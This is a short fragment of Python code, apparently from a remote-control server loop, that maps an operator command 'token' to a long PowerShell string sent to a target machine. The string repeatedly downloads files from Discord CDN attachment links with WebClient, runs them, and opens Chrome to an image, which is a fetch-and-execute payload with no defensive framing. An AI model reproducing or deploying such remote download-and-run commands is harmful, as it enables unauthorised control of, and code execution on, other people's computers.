...
while True:
	...
	if command_to_send == "token":
		...
		command_to_send = "powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://cdn.discordapp.com/attachments/646407583074091011/916798477357449216/barakVID.mp4', 'barakVID.mp4');./barakVID.mp4;$client = new-object System.Net.WebClient;$client = new-object System.Net.WebClient;$client.DownloadFile('https://cdn.discordapp.com/attachments/876192301918068749/916799736172929044/3e789542-37fc-4ebb-8692-ce143393ff37.png', 'barak4.png');./barak4.png;start chrome https://media.discordapp.net/stickers/865029615457271828.png?size=160;$client.DownloadFile('https://cdn.discordapp.com/attachments/646407583074091011/916798477357449216/barakVID.mp4', 'barakVID.mp4');./barakVID.mp4;$client = new-object System.Net.WebClient;$client.DownloadFile('https://cdn.discordapp.com/attachments/876192301918068749/916799736172929044/3e789542-37fc-4ebb-8692-ce143393ff37.png', 'barak4.png');./barak4.png;$client = new-object System.Net.WebClient;$client.DownloadFile('https://cdn.discordapp.com/attachments/646407583074091011/916798477357449216/barakVID.mp4', 'barakVID.mp4');./barakVID.mp4"
